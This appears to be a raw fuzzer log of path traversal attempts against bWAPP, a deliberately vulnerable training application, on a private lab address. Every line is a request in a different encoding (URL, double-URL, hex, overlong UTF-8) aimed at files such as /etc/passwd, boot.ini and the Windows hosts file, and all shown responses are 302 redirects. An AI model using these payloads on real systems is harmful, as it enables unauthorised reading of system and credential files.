2190,302,0L,0W,http://10.0.2.4/bWAPP/.?\.?\etc\issue
2195,302,0L,0W,http://10.0.2.4/bWAPP/.?\.?\.?\boot.ini
2193,302,0L,0W,http://10.0.2.4/bWAPP/.?\.?\.?\etc\passwd
2196,302,0L,0W,http://10.0.2.4/bWAPP/.?\.?\.?\windows\system32\drivers\etc\hosts
2199,302,0L,0W,http://10.0.2.4/bWAPP/.?\.?\.?\.?\boot.ini
2194,302,0L,0W,http://10.0.2.4/bWAPP/.?\.?\.?\etc\issue
2198,302,0L,0W,http://10.0.2.4/bWAPP/.?\.?\.?\.?\etc\issue
2197,302,0L,0W,http://10.0.2.4/bWAPP/.?\.?\.?\.?\etc\passwd
2192,302,0L,0W,http://10.0.2.4/bWAPP/.?\.?\windows\system32\drivers\etc\hosts
2201,302,0L,0W,http://10.0.2.4/bWAPP/.?\.?\.?\.?\.?\etc\passwd
2200,302,0L,0W,http://10.0.2.4/bWAPP/.?\.?\.?\.?\windows\system32\drivers\etc\hosts
2205,302,0L,0W,http://10.0.2.4/bWAPP/.?\.?\.?\.?\.?\.?\etc\passwd
2206,302,0L,0W,http://10.0.2.4/bWAPP/.?\.?\.?\.?\.?\.?\etc\issue
2207,302,0L,0W,http://10.0.2.4/bWAPP/.?\.?\.?\.?\.?\.?\boot.ini
2204,302,0L,0W,http://10.0.2.4/bWAPP/.?\.?\.?\.?\.?\windows\system32\drivers\etc\hosts
2208,302,0L,0W,http://10.0.2.4/bWAPP/.?\.?\.?\.?\.?\.?\windows\system32\drivers\etc\hosts
2203,302,0L,0W,http://10.0.2.4/bWAPP/.?\.?\.?\.?\.?\boot.ini
2202,302,0L,0W,http://10.0.2.4/bWAPP/.?\.?\.?\.?\.?\etc\issue
2211,302,0L,0W,http://10.0.2.4/bWAPP/.?%2fboot.ini
2216,302,0L,0W,http://10.0.2.4/bWAPP/.?%2f.?%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts
2210,302,0L,0W,http://10.0.2.4/bWAPP/.?%2fetc%2fissue
2212,302,0L,0W,http://10.0.2.4/bWAPP/.?%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts
2213,302,0L,0W,http://10.0.2.4/bWAPP/.?%2f.?%2fetc%2fpasswd
2209,302,0L,0W,http://10.0.2.4/bWAPP/.?%2fetc%2fpasswd
2215,302,0L,0W,http://10.0.2.4/bWAPP/.?%2f.?%2fboot.ini
2219,302,0L,0W,http://10.0.2.4/bWAPP/.?%2f.?%2f.?%2fboot.ini
2220,302,0L,0W,http://10.0.2.4/bWAPP/.?%2f.?%2f.?%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts
2217,302,0L,0W,http://10.0.2.4/bWAPP/.?%2f.?%2f.?%2fetc%2fpasswd
2214,302,0L,0W,http://10.0.2.4/bWAPP/.?%2f.?%2fetc%2fissue
2221,302,0L,0W,http://10.0.2.4/bWAPP/.?%2f.?%2f.?%2f.?%2fetc%2fpasswd
2222,302,0L,0W,http://10.0.2.4/bWAPP/.?%2f.?%2f.?%2f.?%2fetc%2fissue
2218,302,0L,0W,http://10.0.2.4/bWAPP/.?%2f.?%2f.?%2fetc%2fissue
2224,302,0L,0W,http://10.0.2.4/bWAPP/.?%2f.?%2f.?%2f.?%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts
2225,302,0L,0W,http://10.0.2.4/bWAPP/.?%2f.?%2f.?%2f.?%2f.?%2fetc%2fpasswd
2226,302,0L,0W,http://10.0.2.4/bWAPP/.?%2f.?%2f.?%2f.?%2f.?%2fetc%2fissue
2172,302,0L,0W,http://10.0.2.4/bWAPP/.?/.?/.?/windows/system32/drivers/etc/hosts
2228,302,0L,0W,http://10.0.2.4/bWAPP/.?%2f.?%2f.?%2f.?%2f.?%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts
2227,302,0L,0W,http://10.0.2.4/bWAPP/.?%2f.?%2f.?%2f.?%2f.?%2fboot.ini
2230,302,0L,0W,http://10.0.2.4/bWAPP/.?%2f.?%2f.?%2f.?%2f.?%2f.?%2fetc%2fissue
2229,302,0L,0W,http://10.0.2.4/bWAPP/.?%2f.?%2f.?%2f.?%2f.?%2f.?%2fetc%2fpasswd
2189,302,0L,0W,http://10.0.2.4/bWAPP/.?\.?\etc\passwd
2231,302,0L,0W,http://10.0.2.4/bWAPP/.?%2f.?%2f.?%2f.?%2f.?%2f.?%2fboot.ini
2223,302,0L,0W,http://10.0.2.4/bWAPP/.?%2f.?%2f.?%2f.?%2fboot.ini
2235,302,0L,0W,http://10.0.2.4/bWAPP/.?%5cboot.ini
2233,302,0L,0W,http://10.0.2.4/bWAPP/.?%5cetc%5cpasswd
2234,302,0L,0W,http://10.0.2.4/bWAPP/.?%5cetc%5cissue
2236,302,0L,0W,http://10.0.2.4/bWAPP/.?%5cwindows%5csystem32%5cdrivers%5cetc%5chosts
2232,302,0L,0W,http://10.0.2.4/bWAPP/.?%2f.?%2f.?%2f.?%2f.?%2f.?%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts
2237,302,0L,0W,http://10.0.2.4/bWAPP/.?%5c.?%5cetc%5cpasswd
2238,302,0L,0W,http://10.0.2.4/bWAPP/.?%5c.?%5cetc%5cissue
2239,302,0L,0W,http://10.0.2.4/bWAPP/.?%5c.?%5cboot.ini
2240,302,0L,0W,http://10.0.2.4/bWAPP/.?%5c.?%5cwindows%5csystem32%5cdrivers%5cetc%5chosts
2241,302,0L,0W,http://10.0.2.4/bWAPP/.?%5c.?%5c.?%5cetc%5cpasswd
2243,302,0L,0W,http://10.0.2.4/bWAPP/.?%5c.?%5c.?%5cboot.ini
2242,302,0L,0W,http://10.0.2.4/bWAPP/.?%5c.?%5c.?%5cetc%5cissue
2245,302,0L,0W,http://10.0.2.4/bWAPP/.?%5c.?%5c.?%5c.?%5cetc%5cpasswd
2244,302,0L,0W,http://10.0.2.4/bWAPP/.?%5c.?%5c.?%5cwindows%5csystem32%5cdrivers%5cetc%5chosts
2246,302,0L,0W,http://10.0.2.4/bWAPP/.?%5c.?%5c.?%5c.?%5cetc%5cissue
2247,302,0L,0W,http://10.0.2.4/bWAPP/.?%5c.?%5c.?%5c.?%5cboot.ini
2249,302,0L,0W,http://10.0.2.4/bWAPP/.?%5c.?%5c.?%5c.?%5c.?%5cetc%5cpasswd
2248,302,0L,0W,http://10.0.2.4/bWAPP/.?%5c.?%5c.?%5c.?%5cwindows%5csystem32%5cdrivers%5cetc%5chosts
2250,302,0L,0W,http://10.0.2.4/bWAPP/.?%5c.?%5c.?%5c.?%5c.?%5cetc%5cissue
2251,302,0L,0W,http://10.0.2.4/bWAPP/.?%5c.?%5c.?%5c.?%5c.?%5cboot.ini
2253,302,0L,0W,http://10.0.2.4/bWAPP/.?%5c.?%5c.?%5c.?%5c.?%5c.?%5cetc%5cpasswd
2252,302,0L,0W,http://10.0.2.4/bWAPP/.?%5c.?%5c.?%5c.?%5c.?%5cwindows%5csystem32%5cdrivers%5cetc%5chosts
2256,302,0L,0W,http://10.0.2.4/bWAPP/.?%5c.?%5c.?%5c.?%5c.?%5c.?%5cwindows%5csystem32%5cdrivers%5cetc%5chosts
2255,302,0L,0W,http://10.0.2.4/bWAPP/.?%5c.?%5c.?%5c.?%5c.?%5c.?%5cboot.ini
2254,302,0L,0W,http://10.0.2.4/bWAPP/.?%5c.?%5c.?%5c.?%5c.?%5c.?%5cetc%5cissue
2257,302,0L,0W,http://10.0.2.4/bWAPP/.?0x2fetc0x2fpasswd
2258,302,0L,0W,http://10.0.2.4/bWAPP/.?0x2fetc0x2fissue
2259,302,0L,0W,http://10.0.2.4/bWAPP/.?0x2fboot.ini
2262,302,0L,0W,http://10.0.2.4/bWAPP/.?0x2f.?0x2fetc0x2fissue
2260,302,0L,0W,http://10.0.2.4/bWAPP/.?0x2fwindows0x2fsystem320x2fdrivers0x2fetc0x2fhosts
2263,302,0L,0W,http://10.0.2.4/bWAPP/.?0x2f.?0x2fboot.ini
2261,302,0L,0W,http://10.0.2.4/bWAPP/.?0x2f.?0x2fetc0x2fpasswd
2264,302,0L,0W,http://10.0.2.4/bWAPP/.?0x2f.?0x2fwindows0x2fsystem320x2fdrivers0x2fetc0x2fhosts
2265,302,0L,0W,http://10.0.2.4/bWAPP/.?0x2f.?0x2f.?0x2fetc0x2fpasswd
2266,302,0L,0W,http://10.0.2.4/bWAPP/.?0x2f.?0x2f.?0x2fetc0x2fissue
2267,302,0L,0W,http://10.0.2.4/bWAPP/.?0x2f.?0x2f.?0x2fboot.ini
2268,302,0L,0W,http://10.0.2.4/bWAPP/.?0x2f.?0x2f.?0x2fwindows0x2fsystem320x2fdrivers0x2fetc0x2fhosts
2270,302,0L,0W,http://10.0.2.4/bWAPP/.?0x2f.?0x2f.?0x2f.?0x2fetc0x2fissue
2273,302,0L,0W,http://10.0.2.4/bWAPP/.?0x2f.?0x2f.?0x2f.?0x2f.?0x2fetc0x2fpasswd
2272,302,0L,0W,http://10.0.2.4/bWAPP/.?0x2f.?0x2f.?0x2f.?0x2fwindows0x2fsystem320x2fdrivers0x2fetc0x2fhosts
2269,302,0L,0W,http://10.0.2.4/bWAPP/.?0x2f.?0x2f.?0x2f.?0x2fetc0x2fpasswd
2277,302,0L,0W,http://10.0.2.4/bWAPP/.?0x2f.?0x2f.?0x2f.?0x2f.?0x2f.?0x2fetc0x2fpasswd
2276,302,0L,0W,http://10.0.2.4/bWAPP/.?0x2f.?0x2f.?0x2f.?0x2f.?0x2fwindows0x2fsystem320x2fdrivers0x2fetc0x2fhosts
2274,302,0L,0W,http://10.0.2.4/bWAPP/.?0x2f.?0x2f.?0x2f.?0x2f.?0x2fetc0x2fissue
2275,302,0L,0W,http://10.0.2.4/bWAPP/.?0x2f.?0x2f.?0x2f.?0x2f.?0x2fboot.ini
2271,302,0L,0W,http://10.0.2.4/bWAPP/.?0x2f.?0x2f.?0x2f.?0x2fboot.ini
2278,302,0L,0W,http://10.0.2.4/bWAPP/.?0x2f.?0x2f.?0x2f.?0x2f.?0x2f.?0x2fetc0x2fissue
2280,302,0L,0W,http://10.0.2.4/bWAPP/.?0x2f.?0x2f.?0x2f.?0x2f.?0x2f.?0x2fwindows0x2fsystem320x2fdrivers0x2fetc0x2fhosts
2279,302,0L,0W,http://10.0.2.4/bWAPP/.?0x2f.?0x2f.?0x2f.?0x2f.?0x2f.?0x2fboot.ini
2281,302,0L,0W,http://10.0.2.4/bWAPP/.?0x5cetc0x5cpasswd
2282,302,0L,0W,http://10.0.2.4/bWAPP/.?0x5cetc0x5cissue
2283,302,0L,0W,http://10.0.2.4/bWAPP/.?0x5cboot.ini
2284,302,0L,0W,http://10.0.2.4/bWAPP/.?0x5cwindows0x5csystem320x5cdrivers0x5cetc0x5chosts
2286,302,0L,0W,http://10.0.2.4/bWAPP/.?0x5c.?0x5cetc0x5cissue
2287,302,0L,0W,http://10.0.2.4/bWAPP/.?0x5c.?0x5cboot.ini
2285,302,0L,0W,http://10.0.2.4/bWAPP/.?0x5c.?0x5cetc0x5cpasswd
2289,302,0L,0W,http://10.0.2.4/bWAPP/.?0x5c.?0x5c.?0x5cetc0x5cpasswd
2288,302,0L,0W,http://10.0.2.4/bWAPP/.?0x5c.?0x5cwindows0x5csystem320x5cdrivers0x5cetc0x5chosts
2290,302,0L,0W,http://10.0.2.4/bWAPP/.?0x5c.?0x5c.?0x5cetc0x5cissue
2294,302,0L,0W,http://10.0.2.4/bWAPP/.?0x5c.?0x5c.?0x5c.?0x5cetc0x5cissue
2292,302,0L,0W,http://10.0.2.4/bWAPP/.?0x5c.?0x5c.?0x5cwindows0x5csystem320x5cdrivers0x5cetc0x5chosts
2295,302,0L,0W,http://10.0.2.4/bWAPP/.?0x5c.?0x5c.?0x5c.?0x5cboot.ini
2291,302,0L,0W,http://10.0.2.4/bWAPP/.?0x5c.?0x5c.?0x5cboot.ini
2293,302,0L,0W,http://10.0.2.4/bWAPP/.?0x5c.?0x5c.?0x5c.?0x5cetc0x5cpasswd
2296,302,0L,0W,http://10.0.2.4/bWAPP/.?0x5c.?0x5c.?0x5c.?0x5cwindows0x5csystem320x5cdrivers0x5cetc0x5chosts
2297,302,0L,0W,http://10.0.2.4/bWAPP/.?0x5c.?0x5c.?0x5c.?0x5c.?0x5cetc0x5cpasswd
2298,302,0L,0W,http://10.0.2.4/bWAPP/.?0x5c.?0x5c.?0x5c.?0x5c.?0x5cetc0x5cissue
2299,302,0L,0W,http://10.0.2.4/bWAPP/.?0x5c.?0x5c.?0x5c.?0x5c.?0x5cboot.ini
2302,302,0L,0W,http://10.0.2.4/bWAPP/.?0x5c.?0x5c.?0x5c.?0x5c.?0x5c.?0x5cetc0x5cissue
2301,302,0L,0W,http://10.0.2.4/bWAPP/.?0x5c.?0x5c.?0x5c.?0x5c.?0x5c.?0x5cetc0x5cpasswd
2300,302,0L,0W,http://10.0.2.4/bWAPP/.?0x5c.?0x5c.?0x5c.?0x5c.?0x5cwindows0x5csystem320x5cdrivers0x5cetc0x5chosts
2305,302,0L,0W,http://10.0.2.4/bWAPP/.?%252fetc%252fpasswd
2303,302,0L,0W,http://10.0.2.4/bWAPP/.?0x5c.?0x5c.?0x5c.?0x5c.?0x5c.?0x5cboot.ini
2306,302,0L,0W,http://10.0.2.4/bWAPP/.?%252fetc%252fissue
2304,302,0L,0W,http://10.0.2.4/bWAPP/.?0x5c.?0x5c.?0x5c.?0x5c.?0x5c.?0x5cwindows0x5csystem320x5cdrivers0x5cetc0x5chosts
2309,302,0L,0W,http://10.0.2.4/bWAPP/.?%252f.?%252fetc%252fpasswd
2308,302,0L,0W,http://10.0.2.4/bWAPP/.?%252fwindows%252fsystem32%252fdrivers%252fetc%252fhosts
2307,302,0L,0W,http://10.0.2.4/bWAPP/.?%252fboot.ini
2310,302,0L,0W,http://10.0.2.4/bWAPP/.?%252f.?%252fetc%252fissue
2315,302,0L,0W,http://10.0.2.4/bWAPP/.?%252f.?%252f.?%252fboot.ini
2313,302,0L,0W,http://10.0.2.4/bWAPP/.?%252f.?%252f.?%252fetc%252fpasswd
2312,302,0L,0W,http://10.0.2.4/bWAPP/.?%252f.?%252fwindows%252fsystem32%252fdrivers%252fetc%252fhosts
2314,302,0L,0W,http://10.0.2.4/bWAPP/.?%252f.?%252f.?%252fetc%252fissue
2316,302,0L,0W,http://10.0.2.4/bWAPP/.?%252f.?%252f.?%252fwindows%252fsystem32%252fdrivers%252fetc%252fhosts
2311,302,0L,0W,http://10.0.2.4/bWAPP/.?%252f.?%252fboot.ini
2318,302,0L,0W,http://10.0.2.4/bWAPP/.?%252f.?%252f.?%252f.?%252fetc%252fissue
2320,302,0L,0W,http://10.0.2.4/bWAPP/.?%252f.?%252f.?%252f.?%252fwindows%252fsystem32%252fdrivers%252fetc%252fhosts
2317,302,0L,0W,http://10.0.2.4/bWAPP/.?%252f.?%252f.?%252f.?%252fetc%252fpasswd
2319,302,0L,0W,http://10.0.2.4/bWAPP/.?%252f.?%252f.?%252f.?%252fboot.ini
2327,302,0L,0W,http://10.0.2.4/bWAPP/.?%252f.?%252f.?%252f.?%252f.?%252f.?%252fboot.ini
2321,302,0L,0W,http://10.0.2.4/bWAPP/.?%252f.?%252f.?%252f.?%252f.?%252fetc%252fpasswd
2323,302,0L,0W,http://10.0.2.4/bWAPP/.?%252f.?%252f.?%252f.?%252f.?%252fboot.ini
2322,302,0L,0W,http://10.0.2.4/bWAPP/.?%252f.?%252f.?%252f.?%252f.?%252fetc%252fissue
2326,302,0L,0W,http://10.0.2.4/bWAPP/.?%252f.?%252f.?%252f.?%252f.?%252f.?%252fetc%252fissue
2329,302,0L,0W,http://10.0.2.4/bWAPP/.?%255cetc%255cpasswd
2324,302,0L,0W,http://10.0.2.4/bWAPP/.?%252f.?%252f.?%252f.?%252f.?%252fwindows%252fsystem32%252fdrivers%252fetc%252fhosts
2333,302,0L,0W,http://10.0.2.4/bWAPP/.?%255c.?%255cetc%255cpasswd
2337,302,0L,0W,http://10.0.2.4/bWAPP/.?%255c.?%255c.?%255cetc%255cpasswd
2336,302,0L,0W,http://10.0.2.4/bWAPP/.?%255c.?%255cwindows%255csystem32%255cdrivers%255cetc%255chosts
2335,302,0L,0W,http://10.0.2.4/bWAPP/.?%255c.?%255cboot.ini
2332,302,0L,0W,http://10.0.2.4/bWAPP/.?%255cwindows%255csystem32%255cdrivers%255cetc%255chosts
2334,302,0L,0W,http://10.0.2.4/bWAPP/.?%255c.?%255cetc%255cissue
2331,302,0L,0W,http://10.0.2.4/bWAPP/.?%255cboot.ini
2338,302,0L,0W,http://10.0.2.4/bWAPP/.?%255c.?%255c.?%255cetc%255cissue
2328,302,0L,0W,http://10.0.2.4/bWAPP/.?%252f.?%252f.?%252f.?%252f.?%252f.?%252fwindows%252fsystem32%252fdrivers%252fetc%252fhosts
2325,302,0L,0W,http://10.0.2.4/bWAPP/.?%252f.?%252f.?%252f.?%252f.?%252f.?%252fetc%252fpasswd
2330,302,0L,0W,http://10.0.2.4/bWAPP/.?%255cetc%255cissue
2340,302,0L,0W,http://10.0.2.4/bWAPP/.?%255c.?%255c.?%255cwindows%255csystem32%255cdrivers%255cetc%255chosts
2342,302,0L,0W,http://10.0.2.4/bWAPP/.?%255c.?%255c.?%255c.?%255cetc%255cissue
2341,302,0L,0W,http://10.0.2.4/bWAPP/.?%255c.?%255c.?%255c.?%255cetc%255cpasswd
2344,302,0L,0W,http://10.0.2.4/bWAPP/.?%255c.?%255c.?%255c.?%255cwindows%255csystem32%255cdrivers%255cetc%255chosts
2343,302,0L,0W,http://10.0.2.4/bWAPP/.?%255c.?%255c.?%255c.?%255cboot.ini
2339,302,0L,0W,http://10.0.2.4/bWAPP/.?%255c.?%255c.?%255cboot.ini
2347,302,0L,0W,http://10.0.2.4/bWAPP/.?%255c.?%255c.?%255c.?%255c.?%255cboot.ini
2348,302,0L,0W,http://10.0.2.4/bWAPP/.?%255c.?%255c.?%255c.?%255c.?%255cwindows%255csystem32%255cdrivers%255cetc%255chosts
2345,302,0L,0W,http://10.0.2.4/bWAPP/.?%255c.?%255c.?%255c.?%255c.?%255cetc%255cpasswd
2346,302,0L,0W,http://10.0.2.4/bWAPP/.?%255c.?%255c.?%255c.?%255c.?%255cetc%255cissue
2349,302,0L,0W,http://10.0.2.4/bWAPP/.?%255c.?%255c.?%255c.?%255c.?%255c.?%255cetc%255cpasswd
2352,302,0L,0W,http://10.0.2.4/bWAPP/.?%255c.?%255c.?%255c.?%255c.?%255c.?%255cwindows%255csystem32%255cdrivers%255cetc%255chosts
2354,302,0L,0W,http://10.0.2.4/bWAPP/.?%c0%2fetc%c0%2fissue
2353,302,0L,0W,http://10.0.2.4/bWAPP/.?%c0%2fetc%c0%2fpasswd
2350,302,0L,0W,http://10.0.2.4/bWAPP/.?%255c.?%255c.?%255c.?%255c.?%255c.?%255cetc%255cissue
2351,302,0L,0W,http://10.0.2.4/bWAPP/.?%255c.?%255c.?%255c.?%255c.?%255c.?%255cboot.ini
2355,302,0L,0W,http://10.0.2.4/bWAPP/.?%c0%2fboot.ini
2356,302,0L,0W,http://10.0.2.4/bWAPP/.?%c0%2fwindows%c0%2fsystem32%c0%2fdrivers%c0%2fetc%c0%2fhosts
2357,302,0L,0W,http://10.0.2.4/bWAPP/.?%c0%2f.?%c0%2fetc%c0%2fpasswd
2358,302,0L,0W,http://10.0.2.4/bWAPP/.?%c0%2f.?%c0%2fetc%c0%2fissue
2361,302,0L,0W,http://10.0.2.4/bWAPP/.?%c0%2f.?%c0%2f.?%c0%2fetc%c0%2fpasswd
2362,302,0L,0W,http://10.0.2.4/bWAPP/.?%c0%2f.?%c0%2f.?%c0%2fetc%c0%2fissue
2359,302,0L,0W,http://10.0.2.4/bWAPP/.?%c0%2f.?%c0%2fboot.ini
2360,302,0L,0W,http://10.0.2.4/bWAPP/.?%c0%2f.?%c0%2fwindows%c0%2fsystem32%c0%2fdrivers%c0%2fetc%c0%2fhosts
2363,302,0L,0W,http://10.0.2.4/bWAPP/.?%c0%2f.?%c0%2f.?%c0%2fboot.ini
2366,302,0L,0W,http://10.0.2.4/bWAPP/.?%c0%2f.?%c0%2f.?%c0%2f.?%c0%2fetc%c0%2fissue
2364,302,0L,0W,http://10.0.2.4/bWAPP/.?%c0%2f.?%c0%2f.?%c0%2fwindows%c0%2fsystem32%c0%2fdrivers%c0%2fetc%c0%2fhosts
2365,302,0L,0W,http://10.0.2.4/bWAPP/.?%c0%2f.?%c0%2f.?%c0%2f.?%c0%2fetc%c0%2fpasswd
2368,302,0L,0W,http://10.0.2.4/bWAPP/.?%c0%2f.?%c0%2f.?%c0%2f.?%c0%2fwindows%c0%2fsystem32%c0%2fdrivers%c0%2fetc%c0%2fhosts
2367,302,0L,0W,http://10.0.2.4/bWAPP/.?%c0%2f.?%c0%2f.?%c0%2f.?%c0%2fboot.ini
2370,302,0L,0W,http://10.0.2.4/bWAPP/.?%c0%2f.?%c0%2f.?%c0%2f.?%c0%2f.?%c0%2fetc%c0%2fissue
2369,302,0L,0W,http://10.0.2.4/bWAPP/.?%c0%2f.?%c0%2f.?%c0%2f.?%c0%2f.?%c0%2fetc%c0%2fpasswd
2371,302,0L,0W,http://10.0.2.4/bWAPP/.?%c0%2f.?%c0%2f.?%c0%2f.?%c0%2f.?%c0%2fboot.ini
2372,302,0L,0W,http://10.0.2.4/bWAPP/.?%c0%2f.?%c0%2f.?%c0%2f.?%c0%2f.?%c0%2fwindows%c0%2fsystem32%c0%2fdrivers%c0%2fetc%c0%2fhosts
2376,302,0L,0W,http://10.0.2.4/bWAPP/.?%c0%2f.?%c0%2f.?%c0%2f.?%c0%2f.?%c0%2f.?%c0%2fwindows%c0%2fsystem32%c0%2fdrivers%c0%2fetc%c0%2fhosts
2374,302,0L,0W,http://10.0.2.4/bWAPP/.?%c0%2f.?%c0%2f.?%c0%2f.?%c0%2f.?%c0%2f.?%c0%2fetc%c0%2fissue
2378,302,0L,0W,http://10.0.2.4/bWAPP/.?%c0%afetc%c0%afissue
2373,302,0L,0W,http://10.0.2.4/bWAPP/.?%c0%2f.?%c0%2f.?%c0%2f.?%c0%2f.?%c0%2f.?%c0%2fetc%c0%2fpasswd
2375,302,0L,0W,http://10.0.2.4/bWAPP/.?%c0%2f.?%c0%2f.?%c0%2f.?%c0%2f.?%c0%2f.?%c0%2fboot.ini
2377,302,0L,0W,http://10.0.2.4/bWAPP/.?%c0%afetc%c0%afpasswd
2379,302,0L,0W,http://10.0.2.4/bWAPP/.?%c0%afboot.ini
2382,302,0L,0W,http://10.0.2.4/bWAPP/.?%c0%af.?%c0%afetc%c0%afissue
2380,302,0L,0W,http://10.0.2.4/bWAPP/.?%c0%afwindows%c0%afsystem32%c0%afdrivers%c0%afetc%c0%afhosts
2381,302,0L,0W,http://10.0.2.4/bWAPP/.?%c0%af.?%c0%afetc%c0%afpasswd
2385,302,0L,0W,http://10.0.2.4/bWAPP/.?%c0%af.?%c0%af.?%c0%afetc%c0%afpasswd
2383,302,0L,0W,http://10.0.2.4/bWAPP/.?%c0%af.?%c0%afboot.ini
2386,302,0L,0W,http://10.0.2.4/bWAPP/.?%c0%af.?%c0%af.?%c0%afetc%c0%afissue
2384,302,0L,0W,http://10.0.2.4/bWAPP/.?%c0%af.?%c0%afwindows%c0%afsystem32%c0%afdrivers%c0%afetc%c0%afhosts
2391,302,0L,0W,http://10.0.2.4/bWAPP/.?%c0%af.?%c0%af.?%c0%af.?%c0%afboot.ini
2393,302,0L,0W,http://10.0.2.4/bWAPP/.?%c0%af.?%c0%af.?%c0%af.?%c0%af.?%c0%afetc%c0%afpasswd
2387,302,0L,0W,http://10.0.2.4/bWAPP/.?%c0%af.?%c0%af.?%c0%afboot.ini
2389,302,0L,0W,http://10.0.2.4/bWAPP/.?%c0%af.?%c0%af.?%c0%af.?%c0%afetc%c0%afpasswd
2390,302,0L,0W,http://10.0.2.4/bWAPP/.?%c0%af.?%c0%af.?%c0%af.?%c0%afetc%c0%afissue
2388,302,0L,0W,http://10.0.2.4/bWAPP/.?%c0%af.?%c0%af.?%c0%afwindows%c0%afsystem32%c0%afdrivers%c0%afetc%c0%afhosts
2392,302,0L,0W,http://10.0.2.4/bWAPP/.?%c0%af.?%c0%af.?%c0%af.?%c0%afwindows%c0%afsystem32%c0%afdrivers%c0%afetc%c0%afhosts
2394,302,0L,0W,http://10.0.2.4/bWAPP/.?%c0%af.?%c0%af.?%c0%af.?%c0%af.?%c0%afetc%c0%afissue
2397,302,0L,0W,http://10.0.2.4/bWAPP/.?%c0%af.?%c0%af.?%c0%af.?%c0%af.?%c0%af.?%c0%afetc%c0%afpasswd
2395,302,0L,0W,http://10.0.2.4/bWAPP/.?%c0%af.?%c0%af.?%c0%af.?%c0%af.?%c0%afboot.ini
2399,302,0L,0W,http://10.0.2.4/bWAPP/.?%c0%af.?%c0%af.?%c0%af.?%c0%af.?%c0%af.?%c0%afboot.ini
2396,302,0L,0W,http://10.0.2.4/bWAPP/.?%c0%af.?%c0%af.?%c0%af.?%c0%af.?%c0%afwindows%c0%afsystem32%c0%afdrivers%c0%afetc%c0%afhosts
